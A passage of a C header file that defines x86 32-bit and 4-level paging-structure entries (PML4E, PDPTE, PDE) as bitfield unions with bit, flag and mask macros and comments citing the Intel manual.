#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)
    UINT32 Accessed : 1;
#define PT_ENTRY_32_ACCESSED_BIT 5
#define PT_ENTRY_32_ACCESSED_FLAG 0x20
#define PT_ENTRY_32_ACCESSED_MASK 0x01
#define PT_ENTRY_32_ACCESSED(_) (((_) >> 5) & 0x01)
    UINT32 Dirty : 1;
#define PT_ENTRY_32_DIRTY_BIT 6
#define PT_ENTRY_32_DIRTY_FLAG 0x40
#define PT_ENTRY_32_DIRTY_MASK 0x01
#define PT_ENTRY_32_DIRTY(_) (((_) >> 6) & 0x01)
    UINT32 LargePage : 1;
#define PT_ENTRY_32_LARGE_PAGE_BIT 7
#define PT_ENTRY_32_LARGE_PAGE_FLAG 0x80
#define PT_ENTRY_32_LARGE_PAGE_MASK 0x01
#define PT_ENTRY_32_LARGE_PAGE(_) (((_) >> 7) & 0x01)
    UINT32 Global : 1;
#define PT_ENTRY_32_GLOBAL_BIT 8
#define PT_ENTRY_32_GLOBAL_FLAG 0x100
#define PT_ENTRY_32_GLOBAL_MASK 0x01
#define PT_ENTRY_32_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT32 Ignored1 : 3;
#define PT_ENTRY_32_IGNORED_1_BIT 9
#define PT_ENTRY_32_IGNORED_1_FLAG 0xE00
#define PT_ENTRY_32_IGNORED_1_MASK 0x07
#define PT_ENTRY_32_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bits 31:12] Physical address of the 4-KByte page referenced by this entry.
     */
    UINT32 PageFrameNumber : 20;
#define PT_ENTRY_32_PAGE_FRAME_NUMBER_BIT 12
#define PT_ENTRY_32_PAGE_FRAME_NUMBER_FLAG 0xFFFFF000
#define PT_ENTRY_32_PAGE_FRAME_NUMBER_MASK 0xFFFFF
#define PT_ENTRY_32_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFF)
  };

  UINT32 Flags;
} PT_ENTRY_32;

/**
 * @defgroup PAGING_STRUCTURES_ENTRY_COUNT_32 \
 *           Paging structures entry counts
 *
 * Paging structures entry counts.
 * @{
 */
#define PDE_ENTRY_COUNT_32 0x00000400
#define PTE_ENTRY_COUNT_32 0x00000400
/**
 * @}
 */

/**
 * @}
 */

/**
 * @defgroup PAGING_64 \
 *           64-Bit (4-Level) Paging
 *
 * A logical processor uses 4-level paging if CR0.PG = 1, CR4.PAE = 1, and IA32_EFER.LME = 1. With
 * 4-level paging, linear address are translated using a hierarchy of in-memory paging structures
 * located using the contents of CR3. 4-level paging translates 48-bit linear addresses to 52-bit
 * physical addresses. Although 52 bits corresponds to 4 PBytes, linear addresses are limited to 48
 * bits; at most 256 TBytes of linear-address space may be accessed at any given time. 4-level
 * paging uses a hierarchy of paging structures to produce a translation for a linear address. CR3
 * is used to locate the first paging-structure, the PML4 table. Use of CR3 with 4-level paging
 * depends on whether processcontext identifiers (PCIDs) have been enabled by setting CR4.PCIDE.
 *
 * @see Vol3A[4.5(4-LEVEL PAGING)] (reference)
 * @{
 */
/**
 * @brief Format of a 4-Level PML4 Entry (PML4E) that References a Page-Directory-Pointer Table
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to reference a page-directory-pointer table.
     */
    UINT64 Present : 1;
#define PML4E_64_PRESENT_BIT 0
#define PML4E_64_PRESENT_FLAG 0x01
#define PML4E_64_PRESENT_MASK 0x01
#define PML4E_64_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 512-GByte region controlled by
     * this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Write : 1;
#define PML4E_64_WRITE_BIT 1
#define PML4E_64_WRITE_FLAG 0x02
#define PML4E_64_WRITE_MASK 0x01
#define PML4E_64_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 512-GByte region
     * controlled by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Supervisor : 1;
#define PML4E_64_SUPERVISOR_BIT 2
#define PML4E_64_SUPERVISOR_FLAG 0x04
#define PML4E_64_SUPERVISOR_MASK 0x01
#define PML4E_64_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * page-directory-pointer table referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelWriteThrough : 1;
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * page-directory-pointer table referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelCacheDisable : 1;
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Accessed : 1;
#define PML4E_64_ACCESSED_BIT 5
#define PML4E_64_ACCESSED_FLAG 0x20
#define PML4E_64_ACCESSED_MASK 0x01
#define PML4E_64_ACCESSED(_) (((_) >> 5) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 7] Reserved (must be 0).
     */
    UINT64 MustBeZero : 1;
#define PML4E_64_MUST_BE_ZERO_BIT 7
#define PML4E_64_MUST_BE_ZERO_FLAG 0x80
#define PML4E_64_MUST_BE_ZERO_MASK 0x01
#define PML4E_64_MUST_BE_ZERO(_) (((_) >> 7) & 0x01)

    /**
     * [Bits 11:8] Ignored.
     */
    UINT64 Ignored1 : 4;
#define PML4E_64_IGNORED_1_BIT 8
#define PML4E_64_IGNORED_1_FLAG 0xF00
#define PML4E_64_IGNORED_1_MASK 0x0F
#define PML4E_64_IGNORED_1(_) (((_) >> 8) & 0x0F)

    /**
     * [Bits 47:12] Physical address of 4-KByte aligned page-directory-pointer table referenced by
     * this entry.
     */
    UINT64 PageFrameNumber : 36;
#define PML4E_64_PAGE_FRAME_NUMBER_BIT 12
#define PML4E_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define PML4E_64_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define PML4E_64_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 4;

    /**
     * [Bits 62:52] Ignored.
     */
    UINT64 Ignored2 : 11;
#define PML4E_64_IGNORED_2_BIT 52
#define PML4E_64_IGNORED_2_FLAG 0x7FF0000000000000
#define PML4E_64_IGNORED_2_MASK 0x7FF
#define PML4E_64_IGNORED_2(_) (((_) >> 52) & 0x7FF)

    /**
     * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed
     * from the 512-GByte region controlled by this entry); otherwise, reserved (must be 0).
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 ExecuteDisable : 1;
#define PML4E_64_EXECUTE_DISABLE_BIT 63
#define PML4E_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PML4E_64_EXECUTE_DISABLE_MASK 0x01
#define PML4E_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PML4E_64;

/**
 * @brief Format of a 4-Level Page-Directory-Pointer-Table Entry (PDPTE) that Maps a 1-GByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to map a 1-GByte page.
     */
    UINT64 Present : 1;
#define PDPTE_1GB_64_PRESENT_BIT 0
#define PDPTE_1GB_64_PRESENT_FLAG 0x01
#define PDPTE_1GB_64_PRESENT_MASK 0x01
#define PDPTE_1GB_64_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 1-GByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Write : 1;
#define PDPTE_1GB_64_WRITE_BIT 1
#define PDPTE_1GB_64_WRITE_FLAG 0x02
#define PDPTE_1GB_64_WRITE_MASK 0x01
#define PDPTE_1GB_64_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 1-GByte page
     * referenced by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Supervisor : 1;
#define PDPTE_1GB_64_SUPERVISOR_BIT 2
#define PDPTE_1GB_64_SUPERVISOR_FLAG 0x04
#define PDPTE_1GB_64_SUPERVISOR_MASK 0x01
#define PDPTE_1GB_64_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * 1-GByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelWriteThrough : 1;
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * 1-GByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelCacheDisable : 1;
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether software has accessed the 1-GByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Accessed : 1;
#define PDPTE_1GB_64_ACCESSED_BIT 5
#define PDPTE_1GB_64_ACCESSED_FLAG 0x20
#define PDPTE_1GB_64_ACCESSED_MASK 0x01
#define PDPTE_1GB_64_ACCESSED(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Dirty; indicates whether software has written to the 1-GByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Dirty : 1;
#define PDPTE_1GB_64_DIRTY_BIT 6
#define PDPTE_1GB_64_DIRTY_FLAG 0x40
#define PDPTE_1GB_64_DIRTY_MASK 0x01
#define PDPTE_1GB_64_DIRTY(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Page size; must be 1 (otherwise, this entry references a page directory).
     */
    UINT64 LargePage : 1;
#define PDPTE_1GB_64_LARGE_PAGE_BIT 7
#define PDPTE_1GB_64_LARGE_PAGE_FLAG 0x80
#define PDPTE_1GB_64_LARGE_PAGE_MASK 0x01
#define PDPTE_1GB_64_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored
     * otherwise.
     *
     * @see Vol3A[4.10(Caching Translation Information)]
     */
    UINT64 Global : 1;
#define PDPTE_1GB_64_GLOBAL_BIT 8
#define PDPTE_1GB_64_GLOBAL_FLAG 0x100
#define PDPTE_1GB_64_GLOBAL_MASK 0x01
#define PDPTE_1GB_64_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT64 Ignored1 : 3;
#define PDPTE_1GB_64_IGNORED_1_BIT 9
#define PDPTE_1GB_64_IGNORED_1_FLAG 0xE00
#define PDPTE_1GB_64_IGNORED_1_MASK 0x07
#define PDPTE_1GB_64_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bit 12] Indirectly determines the memory type used to access the 1-GByte page referenced by
     * this entry.
     *
     * @note The PAT is supported on all processors that support 4-level paging.
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 Pat : 1;
#define PDPTE_1GB_64_PAT_BIT 12
#define PDPTE_1GB_64_PAT_FLAG 0x1000
#define PDPTE_1GB_64_PAT_MASK 0x01
#define PDPTE_1GB_64_PAT(_) (((_) >> 12) & 0x01)
    UINT64 Reserved1 : 17;

    /**
     * [Bits 47:30] Physical address of the 1-GByte page referenced by this entry.
     */
    UINT64 PageFrameNumber : 18;
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER_BIT 30
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFC0000000
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER_MASK 0x3FFFF
#define PDPTE_1GB_64_PAGE_FRAME_NUMBER(_) (((_) >> 30) & 0x3FFFF)
    UINT64 Reserved2 : 4;

    /**
     * [Bits 58:52] Ignored.
     */
    UINT64 Ignored2 : 7;
#define PDPTE_1GB_64_IGNORED_2_BIT 52
#define PDPTE_1GB_64_IGNORED_2_FLAG 0x7F0000000000000
#define PDPTE_1GB_64_IGNORED_2_MASK 0x7F
#define PDPTE_1GB_64_IGNORED_2(_) (((_) >> 52) & 0x7F)

    /**
     * [Bits 62:59] Protection key; if CR4.PKE = 1, determines the protection key of the page;
     * ignored otherwise.
     *
     * @see Vol3A[4.6.2(Protection Keys)]
     */
    UINT64 ProtectionKey : 4;
#define PDPTE_1GB_64_PROTECTION_KEY_BIT 59
#define PDPTE_1GB_64_PROTECTION_KEY_FLAG 0x7800000000000000
#define PDPTE_1GB_64_PROTECTION_KEY_MASK 0x0F
#define PDPTE_1GB_64_PROTECTION_KEY(_) (((_) >> 59) & 0x0F)

    /**
     * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed
     * from the 1-GByte page controlled by this entry); otherwise, reserved (must be 0).
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 ExecuteDisable : 1;
#define PDPTE_1GB_64_EXECUTE_DISABLE_BIT 63
#define PDPTE_1GB_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PDPTE_1GB_64_EXECUTE_DISABLE_MASK 0x01
#define PDPTE_1GB_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PDPTE_1GB_64;

/**
 * @brief Format of a 4-Level Page-Directory-Pointer-Table Entry (PDPTE) that References a Page
 * Directory
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to reference a page directory.
     */
    UINT64 Present : 1;
#define PDPTE_64_PRESENT_BIT 0
#define PDPTE_64_PRESENT_FLAG 0x01
#define PDPTE_64_PRESENT_MASK 0x01
#define PDPTE_64_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 1-GByte region controlled by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Write : 1;
#define PDPTE_64_WRITE_BIT 1
#define PDPTE_64_WRITE_FLAG 0x02
#define PDPTE_64_WRITE_MASK 0x01
#define PDPTE_64_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 1-GByte region
     * controlled by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Supervisor : 1;
#define PDPTE_64_SUPERVISOR_BIT 2
#define PDPTE_64_SUPERVISOR_FLAG 0x04
#define PDPTE_64_SUPERVISOR_MASK 0x01
#define PDPTE_64_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * page directory referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelWriteThrough : 1;
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PDPTE_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * page directory referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelCacheDisable : 1;
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PDPTE_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Accessed : 1;
#define PDPTE_64_ACCESSED_BIT 5
#define PDPTE_64_ACCESSED_FLAG 0x20
#define PDPTE_64_ACCESSED_MASK 0x01
#define PDPTE_64_ACCESSED(_) (((_) >> 5) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 7] Page size; must be 0 (otherwise, this entry maps a 1-GByte page).
     */
    UINT64 LargePage : 1;
#define PDPTE_64_LARGE_PAGE_BIT 7
#define PDPTE_64_LARGE_PAGE_FLAG 0x80
#define PDPTE_64_LARGE_PAGE_MASK 0x01
#define PDPTE_64_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bits 11:8] Ignored.
     */
    UINT64 Ignored1 : 4;
#define PDPTE_64_IGNORED_1_BIT 8
#define PDPTE_64_IGNORED_1_FLAG 0xF00
#define PDPTE_64_IGNORED_1_MASK 0x0F
#define PDPTE_64_IGNORED_1(_) (((_) >> 8) & 0x0F)

    /**
     * [Bits 47:12] Physical address of 4-KByte aligned page directory referenced by this entry.
     */
    UINT64 PageFrameNumber : 36;
#define PDPTE_64_PAGE_FRAME_NUMBER_BIT 12
#define PDPTE_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define PDPTE_64_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define PDPTE_64_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 4;

    /**
     * [Bits 62:52] Ignored.
     */
    UINT64 Ignored2 : 11;
#define PDPTE_64_IGNORED_2_BIT 52
#define PDPTE_64_IGNORED_2_FLAG 0x7FF0000000000000
#define PDPTE_64_IGNORED_2_MASK 0x7FF
#define PDPTE_64_IGNORED_2(_) (((_) >> 52) & 0x7FF)

    /**
     * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed
     * from the 1-GByte region controlled by this entry); otherwise, reserved (must be 0).
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 ExecuteDisable : 1;
#define PDPTE_64_EXECUTE_DISABLE_BIT 63
#define PDPTE_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PDPTE_64_EXECUTE_DISABLE_MASK 0x01
#define PDPTE_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PDPTE_64;

/**
 * @brief Format of a 4-Level Page-Directory Entry that Maps a 2-MByte Page
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to map a 2-MByte page.
     */
    UINT64 Present : 1;
#define PDE_2MB_64_PRESENT_BIT 0
#define PDE_2MB_64_PRESENT_FLAG 0x01
#define PDE_2MB_64_PRESENT_MASK 0x01
#define PDE_2MB_64_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 2-MByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Write : 1;
#define PDE_2MB_64_WRITE_BIT 1
#define PDE_2MB_64_WRITE_FLAG 0x02
#define PDE_2MB_64_WRITE_MASK 0x01
#define PDE_2MB_64_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 2-MByte page
     * referenced by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Supervisor : 1;
#define PDE_2MB_64_SUPERVISOR_BIT 2
#define PDE_2MB_64_SUPERVISOR_FLAG 0x04
#define PDE_2MB_64_SUPERVISOR_MASK 0x01
#define PDE_2MB_64_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * 2-MByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelWriteThrough : 1;
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PDE_2MB_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * 2-MByte page referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelCacheDisable : 1;
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PDE_2MB_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether software has accessed the 2-MByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Accessed : 1;
#define PDE_2MB_64_ACCESSED_BIT 5
#define PDE_2MB_64_ACCESSED_FLAG 0x20
#define PDE_2MB_64_ACCESSED_MASK 0x01
#define PDE_2MB_64_ACCESSED(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Dirty; indicates whether software has written to the 2-MByte page referenced by this
     * entry.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Dirty : 1;
#define PDE_2MB_64_DIRTY_BIT 6
#define PDE_2MB_64_DIRTY_FLAG 0x40
#define PDE_2MB_64_DIRTY_MASK 0x01
#define PDE_2MB_64_DIRTY(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Page size; must be 1 (otherwise, this entry references a page directory).
     */
    UINT64 LargePage : 1;
#define PDE_2MB_64_LARGE_PAGE_BIT 7
#define PDE_2MB_64_LARGE_PAGE_FLAG 0x80
#define PDE_2MB_64_LARGE_PAGE_MASK 0x01
#define PDE_2MB_64_LARGE_PAGE(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored
     * otherwise.
     *
     * @see Vol3A[4.10(Caching Translation Information)]
     */
    UINT64 Global : 1;
#define PDE_2MB_64_GLOBAL_BIT 8
#define PDE_2MB_64_GLOBAL_FLAG 0x100
#define PDE_2MB_64_GLOBAL_MASK 0x01
#define PDE_2MB_64_GLOBAL(_) (((_) >> 8) & 0x01)

    /**
     * [Bits 11:9] Ignored.
     */
    UINT64 Ignored1 : 3;
#define PDE_2MB_64_IGNORED_1_BIT 9
#define PDE_2MB_64_IGNORED_1_FLAG 0xE00
#define PDE_2MB_64_IGNORED_1_MASK 0x07
#define PDE_2MB_64_IGNORED_1(_) (((_) >> 9) & 0x07)

    /**
     * [Bit 12] Indirectly determines the memory type used to access the 2-MByte page referenced by
     * this entry.
     *
     * @note The PAT is supported on all processors that support 4-level paging.
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 Pat : 1;
#define PDE_2MB_64_PAT_BIT 12
#define PDE_2MB_64_PAT_FLAG 0x1000
#define PDE_2MB_64_PAT_MASK 0x01
#define PDE_2MB_64_PAT(_) (((_) >> 12) & 0x01)
    UINT64 Reserved1 : 8;

    /**
     * [Bits 47:21] Physical address of the 2-MByte page referenced by this entry.
     */
    UINT64 PageFrameNumber : 27;
#define PDE_2MB_64_PAGE_FRAME_NUMBER_BIT 21
#define PDE_2MB_64_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFE00000
#define PDE_2MB_64_PAGE_FRAME_NUMBER_MASK 0x7FFFFFF
#define PDE_2MB_64_PAGE_FRAME_NUMBER(_) (((_) >> 21) & 0x7FFFFFF)
    UINT64 Reserved2 : 4;

    /**
     * [Bits 58:52] Ignored.
     */
    UINT64 Ignored2 : 7;
#define PDE_2MB_64_IGNORED_2_BIT 52
#define PDE_2MB_64_IGNORED_2_FLAG 0x7F0000000000000
#define PDE_2MB_64_IGNORED_2_MASK 0x7F
#define PDE_2MB_64_IGNORED_2(_) (((_) >> 52) & 0x7F)

    /**
     * [Bits 62:59] Protection key; if CR4.PKE = 1, determines the protection key of the page;
     * ignored otherwise.
     *
     * @see Vol3A[4.6.2(Protection Keys)]
     */
    UINT64 ProtectionKey : 4;
#define PDE_2MB_64_PROTECTION_KEY_BIT 59
#define PDE_2MB_64_PROTECTION_KEY_FLAG 0x7800000000000000
#define PDE_2MB_64_PROTECTION_KEY_MASK 0x0F
#define PDE_2MB_64_PROTECTION_KEY(_) (((_) >> 59) & 0x0F)

    /**
     * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed
     * from the 2-MByte page controlled by this entry); otherwise, reserved (must be 0).
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 ExecuteDisable : 1;
#define PDE_2MB_64_EXECUTE_DISABLE_BIT 63
#define PDE_2MB_64_EXECUTE_DISABLE_FLAG 0x8000000000000000
#define PDE_2MB_64_EXECUTE_DISABLE_MASK 0x01
#define PDE_2MB_64_EXECUTE_DISABLE(_) (((_) >> 63) & 0x01)
  };

  UINT64 Flags;
} PDE_2MB_64;

/**
 * @brief Format of a 4-Level Page-Directory Entry that References a Page Table
 */
typedef union {
  struct {
    /**
     * [Bit 0] Present; must be 1 to reference a page table.
     */
    UINT64 Present : 1;
#define PDE_64_PRESENT_BIT 0
#define PDE_64_PRESENT_FLAG 0x01
#define PDE_64_PRESENT_MASK 0x01
#define PDE_64_PRESENT(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Read/write; if 0, writes may not be allowed to the 2-MByte region controlled by this
     * entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Write : 1;
#define PDE_64_WRITE_BIT 1
#define PDE_64_WRITE_FLAG 0x02
#define PDE_64_WRITE_MASK 0x01
#define PDE_64_WRITE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 2-MByte region
     * controlled by this entry.
     *
     * @see Vol3A[4.6(Access Rights)]
     */
    UINT64 Supervisor : 1;
#define PDE_64_SUPERVISOR_BIT 2
#define PDE_64_SUPERVISOR_FLAG 0x04
#define PDE_64_SUPERVISOR_MASK 0x01
#define PDE_64_SUPERVISOR(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the
     * page table referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelWriteThrough : 1;
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH_BIT 3
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH_FLAG 0x08
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH_MASK 0x01
#define PDE_64_PAGE_LEVEL_WRITE_THROUGH(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the
     * page table referenced by this entry.
     *
     * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More
     * Recent Processor Families))]
     */
    UINT64 PageLevelCacheDisable : 1;
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE_BIT 4
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE_FLAG 0x10
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE_MASK 0x01
#define PDE_64_PAGE_LEVEL_CACHE_DISABLE(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
     *
     * @see Vol3A[4.8(Accessed and Dirty Flags)]
     */
    UINT64 Accessed : 1;
#define PDE_64_ACCESSED_BIT 5
